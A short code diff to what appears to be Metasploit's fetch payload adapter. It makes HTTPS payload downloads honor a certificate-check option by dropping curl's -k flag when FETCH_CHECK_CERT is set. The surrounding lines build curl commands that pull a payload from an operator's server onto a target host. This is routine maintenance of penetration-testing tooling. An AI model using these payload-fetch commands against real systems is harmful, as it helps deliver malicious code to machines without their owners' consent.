@@ -399,7 +399,12 @@ module Msf::Payload::Adapter::Fetch
     when 'HTTP'
       get_file_cmd = "curl -so #{_remote_destination} http://#{download_uri(uri)}"
     when 'HTTPS'
-      get_file_cmd = "curl -sko #{_remote_destination} https://#{download_uri(uri)}"
+      # -k/--insecure disables TLS certificate verification. Only add it when
+      # the operator has not asked for the certificate to be checked, so that
+      # FETCH_CHECK_CERT is honored here as it already is for the GET and TNFTP
+      # commands.
+      curl_opts = datastore['FETCH_CHECK_CERT'] ? '-so' : '-sko'
+      get_file_cmd = "curl #{curl_opts} #{_remote_destination} https://#{download_uri(uri)}"
     when 'TFTP'
       get_file_cmd = "curl -so #{_remote_destination} tftp://#{download_uri(uri)}"
     else
